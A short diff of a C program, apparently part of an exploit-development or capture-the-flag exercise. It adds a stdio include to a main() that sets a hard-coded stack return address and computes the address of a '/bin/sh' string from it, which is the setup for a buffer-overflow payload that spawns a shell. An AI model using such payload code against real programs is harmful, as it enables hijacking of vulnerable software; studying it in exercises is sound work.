@@ -1,3 +1,5 @@
+#include <stdio.h>
+
 int main() {
 	unsigned int ret_addr = 0xffffd70c;
 	unsigned int bin_sh = ret_addr + 0x8;
